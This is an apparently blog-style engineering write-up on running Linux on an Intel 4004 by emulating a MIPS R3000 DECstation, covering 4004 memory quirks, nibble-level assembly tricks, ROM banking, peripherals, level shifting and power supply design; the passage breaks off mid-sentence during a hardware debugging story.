Before you address memory, you need to select a memory bank. To select a RAM bank, one puts the bank number (0..7) into the accumulator and then executes a DCL (designate command line) instruction. This determines which CM-RAM line(s) go active during memory ops, and this selection remains active until another DCL instruction is executed. If no DCL is ever executed, bank 0 is used. There is no way to read back the current bank. Each RAM bank (if fully populated), is made of 4 4002s. Each 4002 is made of 4 \"registers\". Each \"register\" is made of 16 addressable nibbles and 4 status nibbles. What do I mean by that? Well, if you were to read (using, say, the RDM instruction) memory in a bank from address 0x00 to address 0xFF, you'd first read nibbles 0 through 15 of \"register\" 0 in the 0th 4002, then the 1st \"register\" in it, then the 2nd, and then the 3rd. You'd then read the 0th \"register\" in the 1st 4002, and so on. Thus you'll have accessed every addressable nibble. Note that you did not access any of the \"status nibbles\" thusly. Those are accessed differently. With any address in a \"register\" selected, RD0 will read that 0th statis nibble attached to this register, WR0 will write it. RD1, RD2, RD3, WR1, WR2, and WR3 work similarly, as you'd imagine. Note that the status nibbles are thus not pointer addressable in the normal sense. They are also not accessible to ADM and SBM instructions, and thus to do any math on their contents you must first directly load them into the accumulator. //these next two lines only needed if // the current bank is NOT already 3 LDM 3 //load 3 into accumulator DCL //select bank 3 //these next 2 lines are only needed if // the currently selected address is not // already 0xAB, they also clobber r0, r1 FIM r0, 0xAB //put 0xAB into r0:r1 SRC r0 //put r0:r1's on the bus as addr RDM //read nibble to accumulator As I explained, accessing memory is a multi-step process. As the 4004 has no concept of memory addressing, that is left to whatever memory device is attached to the bus. All memory devices watch the bus to see if their CM-RAM (or CM-ROM) line is active during the X2 bus phase. If so, that means a SRC instruction is executing. All selected memory devices will receive 4 bits (high nibble of address), and then on the next bus phase (X3) they will receive the next 4 bits (low nibble of address). They will store this internally, and use this address for all future I/O instructions, until another address is sent using SRC. A curious little quirk of this is that every memory bank has its own \"current\" address, since only the selected bank will interpret a SRC instruction seen on the bus. So by now it should be clear that to read a nibble at address 0xAB in bank 3, one might have to do something like what you see here on the right. Best case is just one instruction. This only happens if you already had the bank and the address selected. This is unlikely. Second-best case is 2 instructions. This only happens if you happened to have the address already in a register pair, so you only need to execute a SRC before your RDM. If you did not, you'll need to use a FIM and clobber a register pair to get the address into it before using SRC. And if you also are not sure you have the desired memory bank selected, you might also need to load the proper bank number into the accumulator and execute a DCL. Realistically, you'll often end up with the case of FIM + SRC + LDM, which takes up 4 bytes of code and 4 instruction times. Yes...slow //add 32 bits at r2:r3 to 32 bits at r0:r1 //into 32 bits at r4:r5. Clobbers r6 CLC //carry cleared for first add LDM -8 //-loop iter count XCH r6 // ... into r6 loop: SRC r0 //set up addr for LHS INC r1 //increment LHS ptr RDM //get LHS nibble SRC r2 //set up addr for RHS INC r3 //increment RHS ptr ADM //add in RHS nibble SRC r4 //set up addr for DST INC r5 //increment DST ptr WRM //write DST ISZ r6, loop //loop Now let's imagine doing some math (say an addition) on larger (say 32 bit) values. Obviously, we'll store them little-endian. This'll help us since math happens from LSB to MSB, and thus we'll want to increment the pointer. This is much easier than decrementing it, since INC instruction exists, but DEC does not. We'll also assume our value does not cross a 16-nibble boundary, which makes our address incrementation much simpler. You see that code here on the right. Quite verbose. The total useful work here is 1 carry clearing, 8 loads, 8 load-adds, and 8 stores - a total of 25 useful instruction cycles. This code will, in actuality take 91 instruction cycles. The main culprit, as is clear, is the need to constantly increment pointers and manually send them onto the bus. This situation gets a LOT worse if you are not able to guarantee that the values do not cross a 16-nibble boundary. In that case a simple INC will not do, and a more complex construction will be necessary. The issue is not limited to math. A simple implementation of memory copying looks similar and wastes similar amounts of time selecting memory addresses and incrementing registers. As you can imagine, this gets slow very quickly. If you keep some global state in some variables, to access each you need to first waste 2 instruction cycles to load its address into a register pair using FIM, then use one more to send it onto the bus using SRC, and finally you may read it using RDM or write it using WRM. If you have a few global variables that are often used together and in a particular order, you could order them in memory such that accessing the second one does not require using 2 instruction cycles on a FIM, instead using a single INC on the lower nibble of the address you had already loaded. One instruction cycle saved, but you still do need a new SRC. Basically almost every memory access is a 2-instructions-minimum affair, due to the requirement of a SRC. For the nitpicky of you, yes, indeed, a read-modify-write of a nibble need not employ a second SRC, but this is rare. This is where those status nibbles come in handy. Instead of storing your globals in normal memory, you can stash them in status nibbles. Then, a single SRC, targeting any of the 16 nibbles of the \"register\" they belong to enables them to be accessed directly using a single one-instruction-cycle instruction (RD0, RD1, RD2, RD3, WR0, WR1, WR2, or WR3). This is wonderful for data that is often accessed, and once you realize the speed advantages of these \"status nibbles\" you'll want to use them everywhere! This realization allowed me to speed up the 4004 MIPS emulator by a factor of 30%! Performance and clocking All 2-byte 4004 instructions execute in 2 instruction cycles. All but one 1-byte instructions execute in 1 instruction cycle. The exception is FIN which is a one-byte instruction but it takes two instruction cycles. What is an instruction cycle? It is composed of 8 clock cycles, each representing a bus phase. A1, A2, A3 are the first three, and they send the desired ROM address to the ROM, LSB first. Next are M1 and M2 where the ROM outputs the instruction to the CPU (and any memory devices which need to decode it), MSB first. Then come X1, X2, and X3. X1 is when the CPU does some of the work on the instruction. X2 if when I/O is done between the CPU and any memory/I/O devices, the top nibble of SRC's address is also sent during this phase. During X3 the CPU does more of the work for the instruction, and also, if it is a SRC, the low nibble of the address is put on the bus. During X3 the SYNC signal is active, allowing all devices on the bus to [re]sync and prepare for phase A1 of the next instruction cycle. The 4004 needs a two-phase non-overlapping clock at a speed of 740KHz. Intel 4004 manual states that 500KHz is the minimum acceptable clock speed, and I can confirm that 10KHz does not work. How does one even generate a \"2-phase nonoverlapping clock\"? Intel documents a method using some 9602 one-shots and some transistors to generate the proper clock signals. For the reset signal generator they recommend a 7400 and a transistor and a lot of passives. You can see the schematic here. This is no fun for anyone. Luckily intel also made a chip that does this all for you - the 4201. It can connect directly to a crystal and will divide it down by 7 or by 8, producing a proper 2-phase nonoverlapping clock signals at proper 4004 voltage levels. This chip will also generate a good reset signal for all MCS-04 components and (if using a 4040) help implement single-stepping. This one-chip solution is much nicer than the original one intel recommended, if you can get your hands on a 4201. Some more annoying weirdness All MCS-04 components operate at a very strange voltage level: their supply voltage is minus 15 volts. Yes. They also use inverted logic on all pins. To indicate a zero, a pin will be grounded, to indicate a one, a pin will output negative 15V. So to any other chip, even with level shifting, the signals will all appear inverted. Chips do not really care what you call \"ground\", so instead of thinking that MCS-04 chips need \"-15V\", it is simpler to think of them needing \"-10V\" and \"+5V\" supplies, and they are just missing ground pins. This helps in systems that also contain the 4289, since with this exact setup it can interface to normal 5V [[E]EP]ROMs. This just leaves you with the somewhat-annoying problem of generating a few watts of -10V... Initial planning Let's make a dev board To make sure that I could even make a 4004 work correctly, I decided to build a simple dev board on a protoboard. It contained almost the simplest possible 4004 system: a 4201 clock generator with a reset button near it, a 4004 CPU, a single 4002-1 RAM, a 4289 ROM controller, and an ATMEGA48 to act as my ROM. The AVR is fast enough to pretend to be a ROM and easy enough to reprogram in-circuit using AVR ICSP. The board was powered by 5V, and I used an isolated 5V to 10V boost converter module to produce 10V. Its positive output was grounded, giving me a -10V supply to feed to the chips in addition to the +5V I already had. My first attempt to turn the board on did not succeed. I set a conservative 100mA limit on my power supply, and the board was clearly trying to draw more. After verifying that, as far as I could tell, I did not mess anything up, I raised the current limit to 500mA and tried again. It worked. My simple program that blinked a LED connected to the output pin 0 of the 4002 via a 2K resistor worked and the LED blinked. Glorious! My first 4004 program worked from my first try! Output is pretty easy - the 4002 has output pins. Input is a bit harder. The 4289 does support input, but it needs a tristate buffer since its pins are only inputs when the CPU executes an RDR instruction. It also needs a decoder to properly decide which of the 16 4-bit input ports it is reading. I was determined to avoid both of these things. After some math, I decided that I can make do with 4 input pins total. This means that I do not need any decoders. I also decided that if I put a 1K resistor between my data sources and the 4289, that even if they try to fight, their abilities to hurt each other will be limited by the resistor. This should allow me to avoid needing a tristate buffer. This all turned out to work fine. For my proto board I used a single FET with a resistor as my level shifter. On the final board I used a CD40109B. Emulating my 4004 system I had many doubts that I could fit an entire DECstation2100 emulator into 4KB of 4004 machine code. 4004 is very verbose, and operating on nibbles means that basically any operation ends up needing a loop. I was, however, very determined. To save myself the disappointment of developing hardware only to find that the software is impossible, I decided to start with the software. First, I needed an assembler. I was about halfway through writing my own when I stumbled onto A04. It had a number of annoying bugs (eg: it errors out when a JCN or an ISZ is on the last bytes of a ROM page, even if their targets are indeed reachable as they are on the next page). A04 had one major benefit - it existed, saving me the trouble of writing my own. My next step was writing a 4004 emulator (\"u4004\"). This involved some experimentation with the hardware to clarify a few things that had not been clear in the datasheet, for example: how carry flag works in subtraction. Initially the emulator only emulated the 4004 and normal memory, but over time, it grew to properly emulate the complete system I intended to build - a virtual SD card, a virtual SPI UART chip, a virtual VFD, and the same layout of 4002s as I planned to have. This did not take a lot of time, since the 4004 is laughably simple. I do not think it even took a week to write and debug the core of the emulator. Emulating the peripherals took longer, as did writing the code that would parse SPI out of I/O pin states and flag any errors. I REALLY did not want to debug this on real hardware. The closer I could come to it in emulation, the better! Here you can see a screenshot of u4004. It shows the serial console output, the VFD display, and the PC LEDs (more on all this later). It also shows how much real time would pass on a real 740KHz 4004 system to get to the current state. The MIPS emulator Why MIPS Of course, Linux cannot and will not boot on a 4004 directly. There is no C compiler targeting the 4004, nor could one be created due to the limitations of the architecture. The amount of ROM and RAM that is addressable is also simply too low. So, same as before, I would have to resort to emulation. My initial goal was to fit into 4KB of code, as that is what an unmodified unassisted 4004 can address. 4KB of code is not much at all to emulate a complete system. After studying the options, it became clear that MIPS R3000 would be the winner here. Every other architecture I considered would be harder to emulate in some way. Some architectures had arbitrarily-shifted operands all the time (ARM), some have shitty addressing modes necessitating that they would be slow (RISCV), some would need more than 4KB to even decode instructions (x86), and some were just too complex to emulate in so little space (PPC). ... so ... MIPS again... OK! A start I started with emulating just the CPU, to evaluate how much space that would take and help me estimate the feasibility of the project in general. As this was my first time programming in 4004 assembly, I had no feel for how dense the code would be. Initially, I skipped dealing with RAM and just assumed that the \"current\" MIPS instruction will be in r8:r9:r10:r11:r12:r13:r14:r15 registers, MSB-to-LSB. Yup...half of the registers are used just to hold the instruction. I considered using memory for this, but the values would need to be used in many ways in many many places during decode, so that would turn out to be messier. Plus, I still had 8 registers left, that is two more than x86 ever had! Of course, \"assume the instruction ends up in registers\" is not testable, but that was not yet the goal. Initial dispatch (based on the top 6 bits of instruction) to a 64-entry (128-byte) table of unconditional jumps took 13 instructions, including the JIN that it ends with. So 128 + 13 bytes just for that. That is already 3.4% of the entire code space I had. Not a great start. Top level opcodes 0 and 1 each need another sub-table to decode. One table will have 32 entries and the other will have 64. They will need 12 and 14 instructions respectively to calculate the jump target. Thus once we've more or less handled the majority of the decode, we've used 128 + 128 + 64 + 13 + 12 + 14 = 359 bytes of code space. That is over 1/12 of the entire code space, and we have not yet even executed anything. Yeah... It was, of course, approximately at this point that I realized that this project will be harder than I had anticipated. But, no surrender! MIPS has 32 user-visible registers, of which the first is the zero register, writes to which are ignored. 32x 32-bit registers is 1024 bits of register state. This is 256 nibbles, which, in 4004-land, is one full RAM bank. So there we have it: bank 0 will have MIPS register state. MIPS has a delay slot, so in addition to PC we also need to store NEXT_PC so that we can properly handle branches and the delay slots behind them. As PC is not part of the general 32-register bank, these two account for 16 more nibbles of memory (in bank 1). For memory translation, MIPS has a TLB (read more about that here), where each entry is 8 bytes long and there are 64 entries. This would take up 4 complete memory banks. And to access an SD card we'll need at least a sector-sized buffer (512 bytes), which is also 4 memory banks in 4004 land. So we need at least 10 memory banks‽‽‽ No go! Beyond 4 banks, the 4004 needs extra chips; beyond 8 banks we'd be cheating. There must be another way! I decided to punt this problem to later as well. As I continued writing the emulator, the code memory was filling up fast. Most things took a lot of operations, requiring a lot of loops. Some things were very hard due to the way 4004 works and its lack of status flags. Detecting signed overflow was particularly hard. And, of course, 32x32->64 multiply was a huge pain. The signed variant was even harder. I was very glad when it was over, at least I was until I had to implement division. In some cases, signed 32-bit division can take up to 80,000 instruction cycles thanks to needing to operate on only a nibble at a time and ISA design of the 4004. That is almost a second of realtime to perform a division. Realizing this gave me an idea to show PC in LEDs, which I will get back to later. Logical ops I have never before seen a CPU that lacked ability to do basic logical operations, until I saw the 4004 manual. The 4004 lacks ability to do any of them. There is no logical AND, no logical OR, and no XOR. Intel, helpfully, gives sample code in their 4004 programming manual to implement those logical ops on nibbles, but I was able to produce more compact and faster routines. Nonetheless, it takes dozens of cycles PER NIBBLE to do this! How does one even do this? Observe that if we were to isolate a bit from each operand into a register's lower bit (the higher ones being zero), and then add those registers while input carry flag is zero, the result's bit 1 would only be high is the input's two bits were both ones (AND). The result's bit 0 would only be high if the input's bits differed (XOR). If we did the addition with input carry being one, the result's bit 1 would be high if either of the inputs was a one (OR). This is the basic building block of implementing logical ops in the 4004. The rest is looping and shifting! And then, you remember that each MIPS register is 32 bits long, and a whole lot of cycles are going to go into doing all of this per-bit! In addition to the usual suspects of AND, OR, and XOR, MIPS also has NOR. Luckily it is easy to compute in a similar way. One might ask if there is a way to speed this up using some sort of a lookup table? Yes, but a table with 256 entries is 1/16 of the available code space. Three such tables is 3/16. That is a lot of code space to give away in a project where I was not sure I could even make the code fit in as is. So this idea was shelved. Shifts MIPS has the usual complement of shifts: left, arithmetic right, and logical right. They can be by a fixed amount (encoded in instruction) or a variable amount (taken from a register). The second part of that is trivial, we can find the right register and read its value. To the emulator, all shifts are by a variable amount between 0 and 31. Again, the 4004 makes this rather hard. The only shifts it has are shifts by one through the carry flag. So to shift a 32 bit value by one bit, we need a loop with 8 iterations. Thus to shift by N bits, we'll need to run that loop N times. This is getting pretty slow, eh? But wait, there is more. Arithmetic shift right requires the new MSB be the same as the last MSB. The 4004 lacks a way to do this easily, so it takes a few extra instructions to set this up every iteration. Thus, shifts are slow, and they get slower as you need to shift by more bits. One could come up with many clever ways to optimize this, but I was optimizing for code size above all else! Space optimization and 4004-specifics As you may recall, I mentioned that the 4004 has 4 levels of stack, and that one of them is always used as the current PC. This means that if you call into 4 levels of subroutines, you'll not be able to return all the way out to the last. This is annoying, but palatable. However, this also has another fun consequence. Because the 4004 treats the stack as a 4-entry circular buffer, you CAN have an unbalanced number of calls and returns. I use this to save some space in my code. When a MIPS instruction's destination register is $zero, the result is discarded. For speed and code size, I emulate an actual $zero register, and just ignore writes to it. This is faster and simpler than replacing all reads with zeroes as on MIPS more registers are read than written. Now, you might imagine having a isZeroReg() function, and after it, a conditional jump based on its output. If it says \"yes\", go handle next instruction; if \"no\", continue processing the current one. This would be suboptimal, since every callsite would need this conditional jump. My idea is better. My checkZeroReg() just goes to the handle_next_instr label if the destination register is $zero, and does not actually return at all. It only returns back to the caller if the desitnation register is not $zero. This means that every instruction targeting $zero pushes yet another value unto the 4004 stack that will never be popped. However, as long as you do not have too many returns, it is safe to have too many calls. This saves three bytes at every callsite, which there are close to a hundred of. Saves three cycles too! This was a big deal in my increasingly-cramped ROM. There is curious little part about emulating MIPS: When, exactly, can you stop working on an instruction that targets the $zero register? For instructions with no side-effects, you can skip doing any work at all. So for example an ADDIU or an SLL can be skipped entirely. This is not true for instruction that might trap, like ADDU. Here, some work is needed up front - to check if the instruction might overflow and thus need to cause an exception. In my emulator I do this check, and then skip the actual addition if the target is $zero. Why someone might have such an instruction in their binary is another question, but as an emulator writer, correctness is important. Memory load instructions are similar. They might cause an exception, so even if they target $zero, the memory translation and access need to be executed to make sure they succeed (or to cause them to fail as they should). The only part that can be skipped is the final copying of the loaded value to the destination register, and the potential sign-extension. Hypercalls To connect the MIPS emulator to the outside world, hypercalls are used. This allows me to not have to emulate SCSI disks, for example. The hypercalls are actually the same as in the LinuxCard project. They mainly concern accessing storage using the PVD Linux kernel driver and outputting characters for early boot logging. So far, this is sane... Second-order hypercalls But, as I had mentioned, I developed much of this code not on real hardware but on an 4004 emulator I wrote (u4004). This made development easier, since I had not yet even built a board with a real 4004 yet. Indeed it is emulators inside emulators. It is emulators all the way down, in fact. In any case, the 4004 emulator also had hypercalls. Initially, before I properly emulated the SPI-attached SD card, UART chip, PSRAM, and VFD, they literally accessed the host file that pretended to be the SD card and printed to console to display text via hypercalls. This allowed me to focus on the actual emulation bits without worrying about the accessing the real world. It is tight By the time the CPU emulation was complete, there was only about 400 bytes of free space left in my code space allowance of 4096 bytes. And there was much left to do. Since I planned to use a paravirtualized disk driver for Linux, the only peripherals I would really need to emulate would be: the DEC bus fault reporter (reports bus fault address), DZ11 (serial port), and DS1287 (real time clock and timer). The first one is simply a register that can be read. Easy enough. The next two were harder. Luckily, I had a normal MIPS emulator that could boot Linux from the LinuxCard project. I started chopping it up to minimize how much emulation is done of each of the peripherals, until I had them both minimized down to almost nothing. For DS1278, Linux was willing to live with it even if all registers read as zeroes, writes were ignored, an interrupt was periodically delivered, and it was deasserted upon reading of a status register. I decided to do just that - deliver an interrupt every 65,536 MIPS instructions to the emulated CPU. On the DZ11, there was a bit more work, but I was able to cut away all the channels except the zeroth, and to simplify much of the logic and remove all receive and transmit buffers. I also cut down the IRQ capabilities of the R3000 CPU. Only two IRQs are used in this system - RTC and UART. I removed the capability for all others to work as a great speed and code size gain. With the peripherals successfully minimized, I went on to implement them in 4004 assembly. At this point in time, there was 200 bytes of ROM left, but Linux could boot entirely inside the emulator inside the other emulator! The main problem was that there was no code to actually talk to the real hardware I would have to use: SD card, PSRAM, VFD, UART chip. And 200 bytes is a bit tight for all of that. But, I was determined to try! SD card driver and the last of the ROM space So, I added a virtual SD card to u4004, connected to a virtual SPI bus, the three output pins being three pins on a virtual 4002, one input pin being the lowest input on a 4289. I then went on to write what I believe to be the world's smallest SD card driver in existence. It fit into 190 bytes and would successfully init a card, get its size, and allow sector read and write. I also tried this driver on my dev board from earlier, connected to a real SD card, and found that it worked! Woo hoo! I had 10 bytes left in my ROM and a lot more code to write. I scrounged hard and made a little more space - 44 bytes of ROM were free. I then re-read all the docs and saw that on reset, every 4002 will zero its memory, so I did not need to spend code clearing memory on boot. This saved another 12 bytes. 56 bytes free! Still, this was clearly not enough for what I had left. Failure! The emulator needs more ROM How to make ROM banking work Well, OK. I can have 8192 bytes of ROM, in two banks, flippable by a pin controlled by a 4002. Jumping between them would take a little work, but it could be done. And there would finally be more space! The way the bank switching would work is that after the bank output pin is written using WMP, the next instruction would be fetched from the other bank. This means that the call-gates had to be precisely positioned in both banks. Additionally, 4002 outputs reset to outputting 0, which in MCS-04 means the higher output voltage. Practically, this means that the board would boot from bank 1 and not bank 0. Oh well, that is solvable with a cross-bank jump. Calls between pages are also a bit complicated, since the return value is only valid in the page where it originated. So instead of a JMS to a function, now I'd JMS to a veneer that would switch banks, continue in the other bank, JUN to the function, it would JUN at the end to a return veneer, which would swap the banks back, and only then BBL to return. This mess was necessary to not burn one of only three call depth levels available in the 4004. Messy but it worked! Now that I have space... Suddenly I had mode space! So many possibilities opened up! So many pieces of code that had once been optimized for space could now be optimized for speed. There were limits, of course, since jumps between ROM banks were a pain, so only a few things initially got moved. The first were the logical operations. AND, OR, and XOR each got a full 256-entry lookup table in the second ROM bank. How does one implement a lookup table on the 4004? Since the result is a nibble, just a table of BBL instructions is good enough, at a 256-byte boundary. A jump into that ROM page at an index whose high nibble is one input nibble and low nibble is the other input nibble would jump to the BBL that would populate the accumulator with the result. However, if the entire ROM page is filled with BBL instructions, how does one jump to them? Recall that the computed jump instruction JIN had a curious footnote in the manual: if it is the very last instruction in a ROM page, the address that the jump is relative to is not the start of its page but of the next. The 4004 manual warns that this is hard to use and should be avoided! Well, I found it wonderfully easy to use and used it to great success. Then, the functions to AND, OR, or XOR full 32-bit values were simple to implement and ran much faster. Multiplication was another case where a table could help, but this is slightly more complicated. A nibble times a nibble can produce up to a byte of result (0x0f x 0x0f = 0xe1). This means that the trick with a JIN at the end of a page followed by a page full of BBLs with correct value would not work. Well, there is also the FIN instruction which loads a whole byte from ROM into a register pair. In fact, it also has the same quirk with regards to the addressing, so that placing it at the end of a ROM page would indeed allow using the entire next ROM page as data. Wonderful! There is one problem: FIN is not a return statement, so after it performs the load, it will continue executing the next page's data as instructions. This is most unpleasant! There is no way around this in the general case, but I am not seeking to solve the general case. If we imagine a LUT for multiplication, the first 16 entries will be zeroes. So, if we can simply assume that our larger multiplication implementation does not call the LUT for zeroes, then we can simply FIN and then BBL safely. This is what I did, in fact. Multiplication got 8x faster compared to the one-bit-at-a-time implementation I had had before. Hardware At this point, it was becoming clear that the project was feasible, and so it was time to build some real hardware! I decided that the final result should be artistic, recall the 1970s, and be able to be hung on a wall and look pretty! The board would be composed of all through-hole components, thick right-angle-only traces and no vias anywhere for a classic look. Moving on to parts selection... SPI PSRAM Unlike the last time I did this, I had no desire to manually refresh DRAM. Since 2012, wonderful SPI PSRAM chips have appeared from AP MEMORY, ISSI and Vilsion Tech. They are easy to work with and require many fewer pins. I decided I'd use them. They are not through-hole, but they are small and I was willing to compromise. Plus, since I had already written code to do SPI on the 4004, I could reuse it. I wrote an emulator of SPI PSRAM and added it to u4004, so that I could then test my PSRAM driver. It all worked rather well, after I properly remembered that 4002's outputs are inverted. Sadly, emulating a real bit-banged SPI interface slowed the emulation by a factor of two, compared to a magic \"fetch an instruction\" hypercall I had had. Doing things more realistically is always slower. Fetching an instruction, on average, took longer than emulating it now. Sadly, such is life. I considered using full QSPI mode, but I'd need a lot more input pins than my plan called for. I could easily use a 4265 to do this, and speed gains would be nice, but I sought a project that could be reproduced by others. 4265s are rather hard to get, so I decided to do without it. The SPI PSRAM needs time to refresh the internal DRAM, and because of this, there is a minimum time it needs to be left alone between instances of being selected. This would not be hard to meet with my emulator being so slow. It also has a maximum length of time it can be selected, so that it is not blocked from refresh for too long. This limit is 8 msec. I worked hard to meet this time by instrumenting u4004 to keep track of selection length. It is, of course, at this time that I rewrote all the SPI code many times over for speed. Now that I had space in ROM, I also inlined a few uses of it and unrolled some loops. The final clock speed I attained on my bit-banged SPI out a 4002 was about 7.4KHz. Not too fast. Luckily, as per u4004, my longest selection of RAM was 7.4 msec, so I was meeting the datasheet-imposed limit. A later re-examination of the datasheet showed a slight issue with all of the above. The unit in the PSRAM datasheet was microseconds, not milliseconds. Oops! So, I was not meeting the timings, I was blowing them by a factor of nearly a thousand! Luckily, this seemed to be causing no issues at room temperature. After some thought, it makes sense. Since there is a lot of time between my accesses, the chip likely has time to do multiple full-array refreshes between each of my selections. I ran a number of tests on an RP2350-based board severely downclocked and found no issues, so I guess it works well enough! The VFD I knew that I wanted the final hardware I build to be an art piece that I could hang on a wall, so merely having a serial port would not do. What could add more retro flair than a 40x2 VFD display? In my mind: nothing! I was able to locate a VFD display that could speak SPI and use a single 5V supply - a Futaba M402SD10FJ. After some experimentation, I found that it would also happily run on 3.3V! Even better! The protocol to talk to it was a bit strange, and not quite SPI. It used a single line for both input and output. This required some thinking, electrically, but at the end it was resolvable. Why would I need to read from a display? RAM savings. If I want to scroll the display, I need to copy the bottom line to the top line. There are two ways to do this. One is to buffer it and the other is to read it back. Buffering 40 characters requires spending a whole 4002 chip to do that - that feels like a waste when the display itself can support this functionality. At the end I was able to make it work and the display indeed displays the last two lines of output! It is glorious! One annoyance was that the VFD only operates in SPI mode 3, while all other devices I have use mode 0. Luckily, the assembly changes were minimal to support this, and u4004 was updated to support it too. The UART I was not going to implement a full keyboard out of buttons, though. I thought that this would be unsightly, plus I am lazy! I did, however, plan on having a real serial port on the board. There was one problem: despite much searching I found only one through-hole SPI UART chip (the MAX3100), and, sadly it had a fatal flaw. While it supported doing flow-control signaling, it lacked the ability to automatically signal the other side to stop talking when local buffer was full. Instead, its flow control outputs functioned like GPIOs that the host had to control. This was a nonstarter for me, since my host CPU was too slow to do this fast enough. After much soul-searching, I decided that the UART will be the third surface-mount component on this board. Given the option to use an SMT part, I decided on SC16IS741A. It has a large 64-byte buffer and can do flow control automatically, with threshold settings on when to signal stop and when to signal resume. Awesome! I do not use flow control on the TX side since my emulated MIPS CPU simply cannot produce data very fast. I emulated the SC16IS741A in u4004 and verified that my code drove it correctly. I wanted to see both the VFD and the outputted serial data, so I wrote my first curses UI. It was amazingly easy and I am surprised that it took me this long to discover it! The blinkenlights Now that I had curses, I could add more things to u4004. As I have mentioned, the emulator was bound to be rather slow. So, why not, for extra retro flair, show the current PC using 32 LEDs? And if I were to do this, why not also emulate it so that I could verify correctness? I did! For speed, the emulator updates this only every 32 emulated MIPS instruction, which is plenty. The easy level shifting I planned to use the TEST pin on the 4004 to indicate that there was a character ready to receive from the UART chip. This would allow easily checking for it, using JCN T conditional jump. This level shift from 5V to 15V was done using a FET and a resistor - simple stuff. To convert my various 3.3V signals to the 5V that the 4289 will accept as inputs, I used a CD40109B. It has a high input resistance and a low output resistance allowing me to play various tricks with resistors on the output and not worry about anything. Actual RS232 serial port signaling requires some rather high voltages. There are standard chips for dealing with that, and I chose a cheap through-hole one: HIN232. It just needs a few capacitors to work. It converts two lines in each direction between high voltage inverted and low voltage non-inverted signaling. This allows for transmit, receive, and flow control in both directions to be level-shifted. The hard level-shifting problem All that was left was to convert the high-voltage outputs from the 4002s to my 3.3V domain. This turned out to be difficult. My first idea seemed simple but did not work. I reasoned as follows: the input is either -10V or +5V, the output should be either +0V or +3.3V. So if we create a resistor divider with ratio X and the other end of it is at voltage Y, what are the values or X and Y to accomplish the desired result? Two linear equations with two unknowns. Easy. The ratio needs to be around 1:5 and the other voltage needs to be around 2.8V. So, my plan was to use a pretty strong (few dozen ohms) resistor divider to create 2.8V out of my 5V supply, and then use a rather weak resistor divider (few dozen kiloohms) between each 4002 output pin and the 3.3V consumer of its output. This did not work. I spent a lot of time wondering why. I recalled a very strange comment in the intel 4002 manual: \"This port can be made low power TTL compatible by placing a 12K pull-down resistor to Vdd on each pin.\" This comment truly made no sense, since Vdd is at minus 10 volts and that is very much not TTL-compatible. I asked around, but found no satisfactory answer to this. When my voltage dividers did not work, I started wondering if what I had tried to do failed because of some mystery that that comment had been alluding to. I measured the raw outputs of the 4002s before my level shifting resistors and noted that while the high voltage output was indeed +5V, the low was not at -10V, instead hovering at -3V. This is rather odd, since there is no -3V supply anywhere in the system, and the only load on the pins was a 30kiloohm resistor. It was starting to look like the 4002 output pins simply could not sink any appreciable current. Maybe this is why intel suggested a pulldown? A better-informed look at the datasheet confirmed this. Intel specifies that the pins will sink 50 microamps only before they start being dragged up to Vss. At 3mA current sunk, they are only promising an output of Vss-4.85V, which is +0.15V - quite far from the -10V we expected! Suddenly it all makes sense. The pins can source plenty of current, and they will happily fight back against a 12K pulldown, but they suck as sinking current, and the pulldown would help them! It now all made sense! I guess \"TTL compatible\" was intel speak for \"able to actually be connected to anything of consequence that is not a high-sensitivity oscilloscope\". While I was sorting this all out with a healthy dose of guess-and-check, a lot of resistors sprouted over the board, as you can see in the image of the first-revision board there, in the state where it first fully worked! Adding a pulldown, and then using a resistor divider from there ... to another resistor divider was starting to sound needlessly messy, and would likely not work. I came up with a new plan, which will duly horrify any EE. I would add the 10K pulldown, then, the output, via a 2.7K resistor would be used directly, clamped by two diodes, one to +3.3V and one to ground. For high-speed signals this would be problematic, but as MCS-04 chips are quite slow, it would be fine. I prototyped this and it worked well. To save space, I decided to use a TVS instead of 24 diodes. In any case, there was one small remaining problem: diodes have voltage drops, so clamping a signal to ground and +3.3V would in fact produce a signal that varies from -0.65V to +4.15V. Luckily this problem was easy to solve. A 3-resistor divider with low resistances was used to produce +0.65V and +2.65V to feed to the TVS low and high inputs. Did it work? Yes it did! Please take a moment to be truly horrified. Power supplies As can be seen, this board was going to have a lot of different voltage levels. I decided to provide power over USB-C edge connector, same as I did before. This takes care of +5V supply. I also needed -10V, and +3.3V. Limiting myself to only through-hole parts made things a bit complicated. Modern switch-mode controllers are very fancy and efficient, but they only come in surface-mount variants. I was stuck with very very old chips - the ones that were famous for being picky about layouts and would fail to work in fun ways if given an inductor or capacitors they did not like. It was a relief when my 3.3V step-down regulator based on LM2574 worked from the very beginning. The draw on it was a few hundred mA, split mainly between the VFD and the SD card. It caused no issues, which was nice. My first revision board used a MAX764 as a inverted-step-up regulator. It worked fine for a little bit of early bring-up, but if I populated more than four RAM chips, the board would stop working. After scoping the regulator's output it became clear why - it was drooping from the requisite -10V to -7V. This would not do. After some investigation, it became clear that the MAX764 simply cannot supply all the current needed by this many MCS-04 chips. The second revision board used a MAX774, which is basically the same chip as the MAX764, except that the main switch FET can be external, allowing for a beefier one. I also switched to a larger diode and a larger inductor. This worked - all the chips could be powered well. The inductor size is comical, and I asked some people who actually know this stuff why this is, since I've seen plenty of smaller modules that do the same thing I was trying to. The answer was basically that modern chips operate at much higher frequencies (in the MHz), allowing usage of smaller inductors. They are also usually designed by competent EEs, not by me. The MAX774 operates in the KHz frequencies, and thus needs much larger inductors. I was also told that my board layout could be improved, but there was not too much that could be done with through-hole parts and that I should just use a module or some modern regulators. It also took some experimentation with inductors and capacitors to find ones that would produce low-enough output ripple while also not making audible noise. I am happy with the final result - it is silent, can supply over 700mA at -10V with under 200mV ripple. How to debug the hardware This is the 21st century! As you might imagine, the 4004 does not have any built-in debugging capabilities. Luckily, we do not live in the 1970s. You can go and grab yourself one of these bad boys and capture the entire MCS-04 bus for hours on end. Analyzing it might get a bit annoying, though. This is true especially if you are looking for a bug that happens a few million cycles in. It annoyed me enough that I wrote a decoder for the Saleae Logic Pro software that can decode the MCS-04 bus. It will show bus states, ROM addresses and values read from them, disassembly, and the value read from and written to RAM and I/O. It is part of the downloads at the bottom of the page here. Enjoy! The garbled text mystery Why did I need to debug the hardware? At some point in time I assembled a new revision 1.1 board. It booted, but the output text was rarely but noticeably corrupted. Some characters, sometimes, would lose their bottom bits. This would convert the letter \"i\" into \"h\" sometimes, or a \"C\" into a \"B\". This happened rarely, and randomly. Initially I suspected my code for outputting to the serial port and the VFD. But after capturing the bus and analyzing it at depth, I noted that this was not the case. I had to backtrack a few thousand emulated MIPS instructions (a few million 4004 